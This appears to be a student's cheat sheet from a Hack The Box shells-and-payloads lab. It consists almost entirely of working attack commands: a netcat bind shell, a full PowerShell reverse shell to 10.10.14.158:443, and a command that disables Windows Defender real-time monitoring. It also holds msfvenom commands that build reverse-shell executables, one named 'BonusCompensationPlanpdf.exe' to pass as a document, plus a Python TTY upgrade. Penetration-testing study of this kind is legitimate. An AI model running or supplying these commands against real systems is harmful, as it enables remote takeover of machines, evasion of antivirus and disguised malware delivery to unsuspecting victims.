
## Bind Shell
```
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
%% start a listener that starts a shell when you connect to it  from target machine%%

```
$ nc -nv 10.129.41.200 7777
```
%% connect to bind shell from attack host %%

## Reverse Shell
```
$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
%% powershell cmd to establish reverse shell with attack machine. Detectable by AV %%

```
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```
%% disable AV %%

```
$ sudo nc -lvnp 443
```
%% start listener on attack box %%

## Building a Stageless payload
```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
%% buidling a stageless payload using msfvenom %%

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
%% building a simple stageless payload for windows target %%

## Spawning a TTY Shell with Python
```
$ which python
$ python -c 'import pty; pty.spawn("/bin/sh")' 
```
%% use which python to check if python is installed then the next python command to spawn a shell if you get a non-tty shell %%